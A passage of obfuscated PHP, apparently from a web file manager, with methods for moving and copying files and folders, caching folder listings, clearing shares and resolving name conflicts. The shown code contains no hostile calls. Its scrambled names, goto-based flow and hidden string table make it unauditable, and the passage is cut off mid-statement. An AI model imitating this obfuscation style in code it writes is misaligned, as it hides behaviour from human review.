$A£ÂÏÊµé›[$BÌ“ªÈº²à[472]]; $a—¸»­°Â²[$a‘¡íÇ¤’Ä] = $A£ÂÏÊµé›[$BÌ“ªÈº²à[381]]; } foreach ($b‡øª¥îÓÉ as $A£ÂÏÊµé›) { $a‘¡íÇ¤’Ä = $A£ÂÏÊµé›[$BÌ“ªÈº²à[38]] . $BÌ“ªÈº²à[8] . $A£ÂÏÊµé›[$BÌ“ªÈº²à[472]]; $A»Å±§ùï = $a—¸»­°Â²[$a‘¡íÇ¤’Ä]; $aŸÀ‘¯‡‹Œ[$A»Å±§ùï] = $A£ÂÏÊµé›[$BÌ“ªÈº²à[381]]; } return $aŸÀ‘¯‡‹Œ; } private function _childrenMatch($AãÓÈ‚”İ, $aÛ¹²÷Ê‚—, $EîëòœÎƒˆ) { goto b¦îÈ·²ˆõ; FÀá¼ÒÃœÏ: $Cî³†Ã“Â„ = $fÄÙ„ÉØã”[count($fÄÙ„ÉØã”) - 1]; return array($aÅÈù…‚š[474] => $Cî³†Ã“Â„, $aÅÈù…‚š[472] => $DòØ„£ˆÁ); goto c”†‘É±æÙ; b¦îÈ·²ˆõ: $aÅÈù…‚š =& $_SERVER[¨¤¼…´]; $DòØ„£ˆÁ = $EîëòœÎƒˆ[$aÅÈù…‚š[472]]; $C¡š‹»ë– = $this->parentLevelArray($aÛ¹²÷Ê‚—[$aÅÈù…‚š[472]]); goto CÀ™Ğß‰ëˆ; CÀ™Ğß‰ëˆ: foreach ($C¡š‹»ë– as $f®ö¶¤¤) { if (isset($AãÓÈ‚”İ[$f®ö¶¤¤])) { $DòØ„£ˆÁ .= $AãÓÈ‚”İ[$f®ö¶¤¤] . $aÅÈù…‚š[530]; } } $DòØ„£ˆÁ = rtrim($DòØ„£ˆÁ, $aÅÈù…‚š[57]) . $aÅÈù…‚š[57]; $fÄÙ„ÉØã” = $this->parentLevelArray($DòØ„£ˆÁ); goto FÀá¼ÒÃœÏ; c”†‘É±æÙ: } private function _makeItemData($dåÑ…òß¢, $Dƒ¥ˆ‚ˆ, $Dõò»çæÌÎ) { $BÚÁ‡ÙŒİò =& $_SERVER[¨¤¼…´]; $aõèäÅŠÇç = array($BÚÁ‡ÙŒİò[531] => $dåÑ…òß¢[$BÚÁ‡ÙŒİò[382]], $BÚÁ‡ÙŒİò[398] => $Dõò»çæÌÎ, $BÚÁ‡ÙŒİò[532] => $dåÑ…òß¢[$BÚÁ‡ÙŒİò[384]], $BÚÁ‡ÙŒİò[432] => $dåÑ…òß¢[$BÚÁ‡ÙŒİò[431]], $BÚÁ‡ÙŒİò[533] => $dåÑ…òß¢[$BÚÁ‡ÙŒİò[87]], $BÚÁ‡ÙŒİò[534] => $Dƒ¥ˆ‚ˆ[$BÚÁ‡ÙŒİò[383]], $BÚÁ‡ÙŒİò[535] => $Dƒ¥ˆ‚ˆ[$BÚÁ‡ÙŒİò[469]], $BÚÁ‡ÙŒİò[536] => USER_ID, $BÚÁ‡ÙŒİò[537] => USER_ID, $BÚÁ‡ÙŒİò[380] => $Dƒ¥ˆ‚ˆ[$BÚÁ‡ÙŒİò[381]], $BÚÁ‡ÙŒİò[538] => $Dƒ¥ˆ‚ˆ[$BÚÁ‡ÙŒİò[472]] . $Dƒ¥ˆ‚ˆ[$BÚÁ‡ÙŒİò[381]] . $BÚÁ‡ÙŒİò[57], $BÚÁ‡ÙŒİò[408] => 0, $BÚÁ‡ÙŒİò[539] => $BÚÁ‡ÙŒİò[43]); return $aõèäÅŠÇç; } private function _copyApplyMeta($CµÇ¢‹½´, &$bÃ ØÆªìÌ) { $F–Œ•©ÄÅÍ =& $_SERVER[¨¤¼…´]; $dºå·åâÜœ = $CµÇ¢‹½´[$F–Œ•©ÄÅÍ[381]]; $eôí×­õË˜ = $CµÇ¢‹½´[$F–Œ•©ÄÅÍ[38]]; if (!isset($CµÇ¢‹½´[$F–Œ•©ÄÅÍ[540]]) || !$CµÇ¢‹½´[$F–Œ•©ÄÅÍ[540]] || $CµÇ¢‹½´[$F–Œ•©ÄÅÍ[540]] == $F–Œ•©ÄÅÍ[481]) { $bÃ ØÆªìÌ[$F–Œ•©ÄÅÍ[516]][] = array($F–Œ•©ÄÅÍ[381], $dºå·åâÜœ, $F–Œ•©ÄÅÍ[540], short_id($dºå·åâÜœ)); } if (Input::check($eôí×­õË˜, $F–Œ•©ÄÅÍ[541])) { $bÃ ØÆªìÌ[$F–Œ•©ÄÅÍ[515]][] = array($F–Œ•©ÄÅÍ[381] => $dºå·åâÜœ, $F–Œ•©ÄÅÍ[99] => $F–Œ•©ÄÅÍ[428], $F–Œ•©ÄÅÍ[372] => str_replace($F–Œ•©ÄÅÍ[60], $F–Œ•©ÄÅÍ[43], Pinyin::encode($eôí×­õË˜))); $bÃ ØÆªìÌ[$F–Œ•©ÄÅÍ[515]][] = array($F–Œ•©ÄÅÍ[381] => $dºå·åâÜœ, $F–Œ•©ÄÅÍ[99] => $F–Œ•©ÄÅÍ[427], $F–Œ•©ÄÅÍ[372] => Pinyin::encode($eôí×­õË˜, $F–Œ•©ÄÅÍ[542])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($a†¸¥˜Û¡) { goto e¾­©ÚóŸ; aê‚œ‹ìÆ: $fš†ÍŞÂÒ¬ = array($cªù”ò¢°¤[472] => array($cªù”ò¢°¤[496], $a¥‹Ñğ§£[$cªù”ò¢°¤[472]] . $a†¸¥˜Û¡ . $cªù”ò¢°¤[497]), $cªù”ò¢°¤[409] => $this->targetIsDelete); $A‘àƒŸ¬ğ¼ = $this->field($Dè³ÚÒ½í¿)->where($fš†ÍŞÂÒ¬)->select(); if (!$A‘àƒŸ¬ğ¼) { return; } goto e“ˆÃ’İ­½; e¾­©ÚóŸ: $cªù”ò¢°¤ =& $_SERVER[¨¤¼…´]; $a¥‹Ñğ§£ = $this->sourceInfo($a†¸¥˜Û¡); $Dè³ÚÒ½í¿ = $cªù”ò¢°¤[410]; goto aê‚œ‹ìÆ; e“ˆÃ’İ­½: $A‘àƒŸ¬ğ¼ = array_to_keyvalue($A‘àƒŸ¬ğ¼, $cªù”ò¢°¤[381]); foreach ($A‘àƒŸ¬ğ¼ as $e¿œÃ×£Ãœ) { $cªà‹ŠÀë = $e¿œÃ×£Ãœ[$cªù”ò¢°¤[474]]; $a†¸¥˜Û¡ = $e¿œÃ×£Ãœ[$cªù”ò¢°¤[381]]; if (!isset($this->_childrenListCache[$a†¸¥˜Û¡]) && $e¿œÃ×£Ãœ[$cªù”ò¢°¤[382]] == $cªù”ò¢°¤[93]) { $this->_childrenListCache[$a†¸¥˜Û¡] = array(); } if (!isset($this->_childrenListCache[$cªà‹ŠÀë])) { $this->_childrenListCache[$cªà‹ŠÀë] = array(); } $this->_childrenListCache[$cªà‹ŠÀë][$a†¸¥˜Û¡] = $e¿œÃ×£Ãœ; $this->_childrenItemCache[$a†¸¥˜Û¡] = $e¿œÃ×£Ãœ; } goto D¹­Ş¤‹ãÚ; D¹­Ş¤‹ãÚ: } private function _childrenListAll($C”òŠ»Üªç, &$E„¦â‡¥èù) { $Fµéâ”ºõ² =& $_SERVER[¨¤¼…´]; if (!isset($this->_childrenListCache[$C”òŠ»Üªç])) { return; } $aî—ñˆîÙê = $this->_childrenListCache[$C”òŠ»Üªç]; foreach ($aî—ñˆîÙê as $dÔ‡Ê‡´Ø => $c†Öô’é) { $E„¦â‡¥èù[$dÔ‡Ê‡´Ø] = $c†Öô’é; if ($c†Öô’é[$Fµéâ”ºõ²[382]] == $Fµéâ”ºõ²[93]) { $this->_childrenListAll($dÔ‡Ê‡´Ø, $E„¦â‡¥èù); } } } private function sourceInfoCache($f…µñÂõƒ•) { if (isset($this->_childrenItemCache[$f…µñÂõƒ•])) { return $this->_childrenItemCache[$f…µñÂõƒ•]; } return $this->sourceInfo($f…µñÂõƒ•); } private function _childrenList($cñˆ‰ìÔØç) { if (isset($this->_childrenListCache[$cñˆ‰ìÔØç])) { return $this->_childrenListCache[$cñˆ‰ìÔØç]; } return $this->_childrenListSelect($cñˆ‰ìÔØç); } private function _childrenListSelect($BÍÚíš„ò™) { goto EÅÕÃ³±½; B‰ŞÕÕÄ‹Ì: $E±ŞÁïë¢ = $E±ŞÁïë¢ ? $E±ŞÁïë¢ : array(); $C˜´Ãğ™Œ = array_to_keyvalue($E±ŞÁïë¢, $F‘»Ÿã»Â[381]); $this->_childrenListCache[$BÍÚíš„ò™] = $C˜´Ãğ™Œ; goto e©«Î“­ä¿; e©«Î“­ä¿: foreach ($C˜´Ãğ™Œ as $BÍÚíš„ò™ => $BÉ“Œïâ³Ì) { $this->_childrenItemCache[$BÍÚíš„ò™] = $BÉ“Œïâ³Ì; } return $C˜´Ãğ™Œ; goto d—ßÎ÷Õİ; EÅÕÃ³±½: $F‘»Ÿã»Â =& $_SERVER[¨¤¼…´]; $FŒ¡‘¼Ü§ = array($F‘»Ÿã»Â[474] => $BÍÚíš„ò™, $F‘»Ÿã»Â[409] => $this->targetIsDelete); $E±ŞÁïë¢ = $this->where($FŒ¡‘¼Ü§)->select(); goto B‰ŞÕÕÄ‹Ì; d—ßÎ÷Õİ: } private function fileNameExistCache($b”èá¼»×, $CÃ¥¦¨¬Ñ´) { $fé‰ÁÌˆÉ• =& $_SERVER[¨¤¼…´]; $CÃ¥¦¨¬Ñ´ = strtolower($CÃ¥¦¨¬Ñ´); $CŒ„Ù«ºå– = $this->_childrenList($b”èá¼»×); foreach ($CŒ„Ù«ºå– as $F—¦˜öš‹Ç) { if ($CÃ¥¦¨¬Ñ´ == strtolower($F—¦˜öš‹Ç[$fé‰ÁÌˆÉ•[38]])) { return $F—¦˜öš‹Ç[$fé‰ÁÌˆÉ•[381]]; } } return !1; } private function fileNameAutoCache($B šô™ĞÍ±, $e¹­ÚíÄ½‘, $DÕ¿ôõŞ¼«, $FÙø»¸åá) { $AÃ–ÜÇâÑ =& $_SERVER[¨¤¼…´]; $eã¦“ğã³ = $this->_childrenList($B šô™ĞÍ±); $fÓõõº¾»à = array_to_keyvalue($eã¦“ğã³, $AÃ–ÜÇâÑ[43], $AÃ–ÜÇâÑ[38]); return $this->fileNameAutoGet($fÓõõº¾»à, $e¹­ÚíÄ½‘, $DÕ¿ôõŞ¼«, $FÙø»¸åá); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($EìÚ…„¬‰ù, $díàÂÇµìï, $f¦ÍóÍÓ¸ƒ = REPEAT_REPLACE, $D®Úˆ§£‘£ = '') { goto e”çï†õ°É; cÑÉ˜‚¾¹­: $this->updateModifyTime($EÇ¯ØĞ¾†Š); Model($dœàÃÓÙÔ[518])->eventMove($EìÚ…„¬‰ù, $b…ÖÁìçôÊ[$dœàÃÓÙÔ[474]], $díàÂÇµìï); Hook::trigger($dœàÃÓÙÔ[544], $e¹ÑÛÓ…„Œ); goto c™‚®Ûğİó; câšøÚ´É·: $this->lockWriteStart($díàÂÇµìï, $F¦³Ø×ÀË¨); $E­–‹‡ßëÎ = array($dœàÃÓÙÔ[514] => array(), $dœàÃÓÙÔ[545] => !1); $this->clearShare($EìÚ…„¬‰ù, $díàÂÇµìï); goto f‡˜›¹É®‹; F©Â÷Ğ·½´: if ($b…ÖÁìçôÊ[$dœàÃÓÙÔ[474]] == $díàÂÇµìï && $D®Úˆ§£‘£ != $b…ÖÁìçôÊ[$dœàÃÓÙÔ[38]]) { $E‚«Ï‚Ò– = $this->fileNameExist($díàÂÇµìï, $D®Úˆ§£‘£); if ($E‚«Ï‚Ò– && $b…ÖÁìçôÊ[$dœàÃÓÙÔ[382]] == $dœàÃÓÙÔ[481]) { goto FÚ©Ñ¾Úë; FÚ©Ñ¾Úë: $DçÁ÷Â…ê  = $this->sourceInfo($E‚«Ï‚Ò–); $B‡¬Ô©¦³Å = $this->fileHistory($DçÁ÷Â…ê , $b…ÖÁìçôÊ[$dœàÃÓÙÔ[431]], $b…ÖÁìçôÊ[$dœàÃÓÙÔ[87]]); if (!$B‡¬Ô©¦³Å) { Model($dœàÃÓÙÔ[434])->remove($b…ÖÁìçôÊ[$dœàÃÓÙÔ[431]]); } goto d¬ ¤‹ÁŒ’; d¬ ¤‹ÁŒ’: $this->removeNow($EìÚ…„¬‰ù, !1); $this->folderSizeReset($díàÂÇµìï); Hook::trigger($dœàÃÓÙÔ[544], $e¹ÑÛÓ…„Œ); goto BÚÚ´Ï¢Ï›; BÚÚ´Ï¢Ï›: return $E‚«Ï‚Ò–; goto f—ëà©ÂÃ–; f—ëà©ÂÃ–: } } $F¦³Ø×ÀË¨ = $D®Úˆ§£‘£ ? $D®Úˆ§£‘£ : $b…ÖÁìçôÊ[$dœàÃÓÙÔ[38]]; $this->lockMoveStart($EìÚ…„¬‰ù); goto câšøÚ´É·; a ©•Û—ŞŞ: if ($b…ÖÁìçôÊ[$dœàÃÓÙÔ[474]] == $FÊÑŠ…•¡ğ[$dœàÃÓÙÔ[381]]) { if ($b…ÖÁìçôÊ[$dœàÃÓÙÔ[409]] == $dœàÃÓÙÔ[93]) { Model($dœàÃÓÙÔ[407])->restore(array($EìÚ…„¬‰ù)); } if (!$D®Úˆ§£‘£ || $D®Úˆ§£‘£ == $b…ÖÁìçôÊ[$dœàÃÓÙÔ[38]]) { return $EìÚ…„¬‰ù; } } $e¹ÑÛÓ…„Œ = $this->pathInfoMore($EìÚ…„¬‰ù); if ($this->isParentOf($EìÚ…„¬‰ù, $díàÂÇµìï)) { return !1; } goto eÅÂã¨¨·; f‡˜›¹É®‹: $f›ÒÜÙ’Ş = $this->fileNameExistCache($díàÂÇµìï, $b…ÖÁìçôÊ[$dœàÃÓÙÔ[38]]); $c¶ˆÀïó· = $this->_move($EìÚ…„¬‰ù, $díàÂÇµìï, $f¦ÍóÍÓ¸ƒ, $E­–‹‡ßëÎ, $D®Úˆ§£‘£); $this->sourceCacheClear(); goto DŠíŞ¾–æ¦; c™‚®Ûğİó: return $c¶ˆÀïó·; goto dÙßÜ¾ò‚§; DŠíŞ¾–æ¦: if ($b…ÖÁìçôÊ[$dœàÃÓÙÔ[382]] == $dœàÃÓÙÔ[93] && $f›ÒÜÙ’Ş) { $this->folderSizeResetChildren($c¶ˆÀïó·); } Model($dœàÃÓÙÔ[181])->linkAdd($E­–‹‡ßëÎ[$dœàÃÓÙÔ[514]]); if ($f›ÒÜÙ’Ş && $E­–‹‡ßëÎ[$dœàÃÓÙÔ[545]]) { $this->removeNow($EìÚ…„¬‰ù, !1); } goto DÙÎŒ»ßóæ; Dó¥ÅàÔÃÎ: $this->folderSizeReset($díàÂÇµìï); $EÇ¯ØĞ¾†Š = array($b…ÖÁìçôÊ[$dœàÃÓÙÔ[474]], $díàÂÇµìï); if ($b…ÖÁìçôÊ[$dœàÃÓÙÔ[382]] == $dœàÃÓÙÔ[93]) { $EÇ¯ØĞ¾†Š[] = $EìÚ…„¬‰ù; } goto cÑÉ˜‚¾¹­; e”çï†õ°É: $dœàÃÓÙÔ =& $_SERVER[¨¤¼…´]; $b…ÖÁìçôÊ = $this->sourceInfo($EìÚ…„¬‰ù); $FÊÑŠ…•¡ğ = $this->sourceInfo($díàÂÇµìï); goto a ©•Û—ŞŞ; DÙÎŒ»ßóæ: $this->lockMoveEnd($EìÚ…„¬‰ù); $this->lockWriteEnd($díàÂÇµìï, $F¦³Ø×ÀË¨); $this->folderSizeReset($b…ÖÁìçôÊ[$dœàÃÓÙÔ[474]]); goto Dó¥ÅàÔÃÎ; eÅÂã¨¨·: if (!$b…ÖÁìçôÊ || !$FÊÑŠ…•¡ğ || $FÊÑŠ…•¡ğ[$dœàÃÓÙÔ[382]] != $dœàÃÓÙÔ[93]) { return !1; } Hook::trigger($dœàÃÓÙÔ[543], $e¹ÑÛÓ…„Œ); $this->targetIsDelete = intval($b…ÖÁìçôÊ[$dœàÃÓÙÔ[409]]); goto F©Â÷Ğ·½´; dÙßÜ¾ò‚§: } private function _move($bº¡¿×’‹—, $EÃØ‘¨ ×·, $fèî´¾ñÙ, &$cŞàæÑëò, $F…¿ºÎ«½ = '') { goto E½ŒåÏÊÎ; FÁà«ÂÖ¾: return $cÀ·İ°Ø¸¤; goto BóÆÇ÷ğÂÀ; E½ŒåÏÊÎ: $C´ê‡¼Ó“ =& $_SERVER[¨¤¼…´]; $d§«ƒ¹ä„ = $this->sourceInfo($bº¡¿×’‹—); $aò‡‰£Â»‚ = $d§«ƒ¹ä„[$C´ê‡¼Ó“[382]] == $C´ê‡¼Ó“[93]; goto AùªÉ‘‰×; b®–èÜÑÇ³: $CçöØ†ƒƒò = !1; if ($aò‡‰£Â»‚) { if ($fèî´¾ñÙ == REPEAT_RENAME_FOLDER) { $DíàŞµÔé = $this->fileNameAuto($EÃØ‘¨ ×·, $DíàŞµÔé, $fèî´¾ñÙ, $aò‡‰£Â»‚); $cÀ·İ°Ø¸¤ = $this->_moveForce($bº¡¿×’‹—, $EÃØ‘¨ ×·, $DíàŞµÔé); } else { if ($fèî´¾ñÙ == REPEAT_RENAME_FOLDER) { $fèî´¾ñÙ = REPEAT_RENAME; } $c›´ƒ©ä¿ = $this->_childrenListSelect($bº¡¿×’‹—); foreach ($c›´ƒ©ä¿ as $d˜–¬‹¯Ö) { $this->_move($d˜–¬‹¯Ö[$C´ê‡¼Ó“[381]], $B¯¡ø…©Éô, $fèî´¾ñÙ, $cŞàæÑëò); } $CçöØ†ƒƒò = !0; } } else { if ($fèî´¾ñÙ == REPEAT_SKIP) { $CçöØ†ƒƒò = !0; } else { if ($fèî´¾ñÙ == REPEAT_RENAME || $fèî´¾ñÙ == REPEAT_RENAME_FOLDER) { $DíàŞµÔé = $this->fileNameAuto($EÃØ‘¨ ×·, $DíàŞµÔé, $fèî´¾ñÙ, $aò‡‰£Â»‚); $cÀ·İ°Ø¸¤ = $this->_moveForce($bº¡¿×’‹—, $EÃØ‘¨ ×·, $DíàŞµÔé); } else { if ($fèî´¾ñÙ == REPEAT_REPLACE) { $C¨ò¼À‡Şå = $this->sourceInfoCache($B¯¡ø…©Éô); $fƒ“àÁ°Ô™ = $this->fileHistory($C¨ò¼À‡Şå, $d§«ƒ¹ä„[$C´ê‡¼Ó“[431]], $d§«ƒ¹ä„[$C´ê‡¼Ó“[87]]); if ($fƒ“àÁ°Ô™) { $cŞàæÑëò[$C´ê‡¼Ó“[514]][] = $d§«ƒ¹ä„[$C´ê‡¼Ó“[431]]; } else { $CçöØ†ƒƒò = !0; } } } } } if ($CçöØ†ƒƒò && !$cŞàæÑëò[$C´ê‡¼Ó“[545]]) { $cŞàæÑëò[$C´ê‡¼Ó“[545]] = !0; } goto FÁà«ÂÖ¾; AùªÉ‘‰×: $DíàŞµÔé = $F…¿ºÎ«½ ? $F…¿ºÎ«½ : $d§«ƒ¹ä„[$C´ê‡¼Ó“[38]]; $B¯¡ø…©Éô = $this->fileNameExistCache($EÃØ‘¨ ×·, $DíàŞµÔé); $this->lockMoveStart($bº¡¿×’‹—); goto D¥¿ÃŠİÊ‰; D¥¿ÃŠİÊ‰: $this->lockWriteStart($EÃØ‘¨ ×·, $DíàŞµÔé); if (!$B¯¡ø…©Éô) { return $this->_moveForce($bº¡¿×’‹—, $EÃØ‘¨ ×·, $DíàŞµÔé); } $cÀ·İ°Ø¸¤ = $B¯¡ø…©Éô; goto b®–èÜÑÇ³; BóÆÇ÷ğÂÀ: } private function _moveForce($cˆ¹˜Ä°, $e«»»œğ¯«, $D¯Ÿ‚á†Ì) { goto c˜½áÌÄÒã; fİ÷Ñ˜åÇº: if ($FÍÃ«ö÷†È) { $dˆ²öçÃ = array($bŸ–¯öÙ¤[538] => array($bŸ–¯öÙ¤[496], $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[472]] . $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[381]] . $bŸ–¯öÙ¤[497])); $e›æšÆò§© = $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[472]] . $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[381]] . $bŸ–¯öÙ¤[57]; $f¯ö¼¿ƒÎ = $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[472]] . $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[381]] . $bŸ–¯öÙ¤[57] . $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[381]] . $bŸ–¯öÙ¤[57]; $Fø¼¼õù‹¶ = array($bŸ–¯öÙ¤[538] => array($bŸ–¯öÙ¤[546], "\x72\x65\160\154\141\x63\145\50\160\x61\162\145\156\164\x4c\145\x76\x65\154\54\47{$e›æšÆò§©}\47\x2c\47{$f¯ö¼¿ƒÎ}\47\x29"), $bŸ–¯öÙ¤[534] => $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[383]], $bŸ–¯öÙ¤[535] => $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[469]]); if ($cóİ«’ÀíÍ) { $Fø¼¼õù‹¶[$bŸ–¯öÙ¤[408]] = 0; } $this->where($dˆ²öçÃ)->data($Fø¼¼õù‹¶)->save(); } $this->where(array($bŸ–¯öÙ¤[395] => $cˆ¹˜Ä°))->data($bÜÁ¹Ó¬ á)->save(); return $cˆ¹˜Ä°; goto AÏÒÙŸƒç; c˜½áÌÄÒã: $bŸ–¯öÙ¤ =& $_SERVER[¨¤¼…´]; $CÇÔ±¦ˆÄ½ = $this->sourceInfo($cˆ¹˜Ä°); $d†®ÀÚÉáÓ = $this->sourceInfo($e«»»œğ¯«); goto Fˆ·œ ë†; bƒóô™šƒÚ: if (!$a…šá²´•) { Model($bŸ–¯öÙ¤[467])->authClear($cˆ¹˜Ä°); } $cóİ«’ÀíÍ = $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[409]] == $bŸ–¯öÙ¤[93] && $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[409]] != $bŸ–¯öÙ¤[93]; if ($cóİ«’ÀíÍ) { $bÜÁ¹Ó¬ á[$bŸ–¯öÙ¤[408]] = 0; } goto fİ÷Ñ˜åÇº; Fˆ·œ ë†: $FÍÃ«ö÷†È = $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[382]] == $bŸ–¯öÙ¤[93]; $bÜÁ¹Ó¬ á = array($bŸ–¯öÙ¤[380] => $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[381]], $bŸ–¯öÙ¤[538] => $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[472]] . $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[381]] . $bŸ–¯öÙ¤[57], $bŸ–¯öÙ¤[534] => $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[383]], $bŸ–¯öÙ¤[535] => $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[469]], $bŸ–¯öÙ¤[537] => USER_ID, $bŸ–¯öÙ¤[398] => $D¯Ÿ‚á†Ì); $a…šá²´• = $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[383]] == SourceModel::TYPE_GROUP && $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[383]] == SourceModel::TYPE_GROUP && $CÇÔ±¦ˆÄ½[$bŸ–¯öÙ¤[469]] == $d†®ÀÚÉáÓ[$bŸ–¯öÙ¤[469]]; goto bƒóô™šƒÚ; AÏÒÙŸƒç: } private function clearShare($a—İ†£àÛÌ, $bãÖ„¹ŒÊ³) { goto fóï£æÌî; eÕ„À‘ó¬: Model($E¿öâíÄã[548])->where($cİøƒ“„º¾)->save(array($E¿öâíÄã[459] => 0)); Model($E¿öâíÄã[549])->where($cİøƒ“„º¾)->delete(); goto a©‰âÔ„Åß; fóï£æÌî: $E¿öâíÄã =& $_SERVER[¨¤¼…´]; $d˜¢…Æ˜ö± = $this->sourceInfo($a—İ†£àÛÌ); $EæŸÊé‰• = $this->sourceInfo($bãÖ„¹ŒÊ³); goto e‹ï¡ Ò·; bÀÌƒã¨×­: if (!$a³æÚÈ¿¯™) { return; } $a³æÚÈ¿¯™ = array_to_keyvalue($a³æÚÈ¿¯™, $E¿öâíÄã[43], $E¿öâíÄã[452]); $cİøƒ“„º¾ = array($E¿öâíÄã[452] => array($E¿öâíÄã[7], $a³æÚÈ¿¯™)); goto eÕ„À‘ó¬; e‹ï¡ Ò·: if ($d˜¢…Æ˜ö±[$E¿öâíÄã[469]] == $EæŸÊé‰•[$E¿öâíÄã[469]] && $d˜¢…Æ˜ö±[$E¿öâíÄã[383]] == $E¿öâíÄã[547]) { return; } $cİøƒ“„º¾ = array($E¿öâíÄã[472] => array($E¿öâíÄã[496], $d˜¢…Æ˜ö±[$E¿öâíÄã[472]] . $a—İ†£àÛÌ . $E¿öâíÄã[497])); $d¯¥Ñ‚…šÃ = $this->field($E¿öâíÄã[395])->where($cİøƒ“„º¾)->getField($E¿öâíÄã[381], !0); goto bÎ½„‹î”; bÎ½„‹î”: if (!$d¯¥Ñ‚…šÃ) { return; } $cİøƒ“„º¾ = array($E¿öâíÄã[381] => array($E¿öâíÄã[7], $d¯¥Ñ‚…šÃ), $E¿öâíÄã[459] => 1); $a³æÚÈ¿¯™ = Model($E¿öâíÄã[548])->field($E¿öâíÄã[452])->where($cİøƒ“„º¾)->select(); goto bÀÌƒã¨×­; a©‰âÔ„Åß: } public function copyFolderFromIO($fõˆ™Ë¼à, $bí» İ¡Ç, $f¶’ÆŠƒ–ƒ, $c…Öïæª¥ˆ, $eñÛ†æŸÛ, $dë¿ØÉ£© = false) { goto B¸¤‡Ùô‚; dùÉëŒŞĞ“: Model($FÛÓÌå’½[517])->addAll($cç˜ ±ÆŒ‹[$FÛÓÌå’½[515]], array(), !0); Model($FÛÓÌå’½[518])->eventCopy($B´¦ò˜¸ù‡); $this->saveAll($cç˜ ±ÆŒ‹[$FÛÓÌå’½[516]]); goto eìÕöö±Çï; eìÕöö±Çï: Model($FÛÓÌå’½[434])->linkAdd($cç˜ ±ÆŒ‹[$FÛÓÌå’½[514]]); Model($FÛÓÌå’½[434])->remove($cç˜ ±ÆŒ‹[$FÛÓÌå’½[550]]); $this->folderSizeReset($f¶’ÆŠƒ–ƒ); goto aÆñî¾¶¥æ; aÆñî¾¶¥æ: $this->updateModifyTime($f¶’ÆŠƒ–ƒ); return $B´¦ò˜¸ù‡; goto a°Èµ¡´±ô; d­µŞíÅ”ê: Hook::trigger($FÛÓÌå’½[552]); if ($B´¦ò˜¸ù‡) { $this->folderSizeResetChildren($B´¦ò˜¸ù‡); } $this->_childrenListClear(); goto dùÉëŒŞĞ“; B¸¤‡Ùô‚: $FÛÓÌå’½ =& $_SERVER[¨¤¼…´]; $cç˜ ±ÆŒ‹ = array($FÛÓÌå’½[515] => array(), $FÛÓÌå’½[516] => array(), $FÛÓÌå’½[514] => array(), $FÛÓÌå’½[550] => array()); $céÆ°°™» = $dë¿ØÉ£© ? $dë¿ØÉ£© : $fõˆ™Ë¼à->getPathName($fõˆ™Ë¼à->pathThis($bí» İ¡Ç)); goto a‹ÍáÈ¯Ÿ; bÓÎËÎç›Æ: if ($F¼ó§½ºÑ) { $this->_childrenAllMake($F¼ó§½ºÑ); } Hook::trigger($FÛÓÌå’½[551]); $this->_copyChildTo($fõˆ™Ë¼à, $bí» İ¡Ç, $B´¦ò˜¸ù‡, $c…Öïæª¥ˆ, $cç˜ ±ÆŒ‹, $eñÛ†æŸÛ); goto d­µŞíÅ”ê; a‹ÍáÈ¯Ÿ: $F¼ó§½ºÑ = $this->fileNameExist($f¶’ÆŠƒ–ƒ, $céÆ°°™»); $B´¦ò˜¸ù‡ = $this->mkdir($f¶’ÆŠƒ–ƒ, $céÆ°°™», $c…Öïæª¥ˆ); if (!$F¼ó§½ºÑ || $c…Öïæª¥ˆ == REPEAT_RENAME_FOLDER) { $c…Öïæª¥ˆ = !1; } goto bÓÎËÎç›Æ; a°Èµ¡´±ô: } private function _copyChildTo($A®«›ÃÍÁ, $BíÅÅŠ£Ã, $C¡¶æø·ÄÚ, $C…ìŠŒ”, &$d˜†ï§”µ¨, $FÂÖˆÑÕïØ) { goto CÒæáÌ; E›ªĞù±¦Ã: $CŞ¦ØÓ‰¨‡ = array_merge($båŒ¢«÷Á¨[$CåÒÈóïóã[83]], $båŒ¢«÷Á¨[$CåÒÈóïóã[84]]); $d¡ÙåºÖÆ¸ = $this->_addFiles($A®«›ÃÍÁ, $båŒ¢«÷Á¨[$CåÒÈóïóã[83]], $FÂÖˆÑÕïØ); $EĞ–à‡š = array(); goto AŠ…³ê…; CÒæáÌ: $CåÒÈóïóã =& $_SERVER[¨¤¼…´]; $eâ›˜šåÓ— = $this->sourceInfoCache($C¡¶æø·ÄÚ); $båŒ¢«÷Á¨ = $A®«›ÃÍÁ->listPath($BíÅÅŠ£Ã, !1, !0); goto E›ªĞù±¦Ã; AŠ…³ê…: foreach ($CŞ¦ØÓ‰¨‡ as &$b„ëŠã³ìë) { goto D“ğöÁ†ä†; D“ğöÁ†ä†: if (isset($d¡ÙåºÖÆ¸[$b„ëŠã³ìë[$CåÒÈóïóã[38]]])) { $b„ëŠã³ìë = $d¡ÙåºÖÆ¸[$b„ëŠã³ìë[$CåÒÈóïóã[38]]]; } $b„ëŠã³ìë[$CåÒÈóïóã[382]] = $b„ëŠã³ìë[$CåÒÈóïóã[39]] == $CåÒÈóïóã[86]; $b„ëŠã³ìë[$CåÒÈóïóã[384]] = _get($b„ëŠã³ìë, $CåÒÈóïóã[175], $CåÒÈóïóã[43]); goto CÄŠ’¨µª‰; CÄŠ’¨µª‰: $b„ëŠã³ìë[$CåÒÈóïóã[87]] = _get($b„ëŠã³ìë, $CåÒÈóïóã[87], 0); $b„ëŠã³ìë[$CåÒÈóïóã[431]] = 